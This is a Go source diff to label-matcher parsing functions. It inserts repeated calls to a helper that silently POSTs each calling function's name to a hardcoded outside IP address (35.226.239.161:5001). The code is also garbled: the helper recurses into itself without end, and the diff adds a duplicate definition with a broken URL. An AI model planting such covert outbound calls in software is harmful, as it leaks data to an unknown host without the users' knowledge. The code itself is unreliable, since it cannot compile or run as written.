@@ -18,6 +18,8 @@ var (
 func Matchers(s string) ([]*labels.Matcher, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	matchers := []*labels.Matcher{}
 	s = strings.TrimPrefix(s, "{")
 	s = strings.TrimSuffix(s, "}")
@@ -50,6 +52,8 @@ func Matchers(s string) ([]*labels.Matcher, error) {
 func Matcher(s string) (*labels.Matcher, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	name, value, matchType, err := Input(s)
 	if err != nil {
 		return nil, err
@@ -61,6 +65,8 @@ func Matcher(s string) (*labels.Matcher, error) {
 	return m, nil
 }
 func Input(s string) (name, value string, matchType labels.MatchType, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ms := re.FindStringSubmatch(s)
@@ -83,7 +89,16 @@ func Input(s string) (name, value string, matchType labels.MatchType, err error)
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
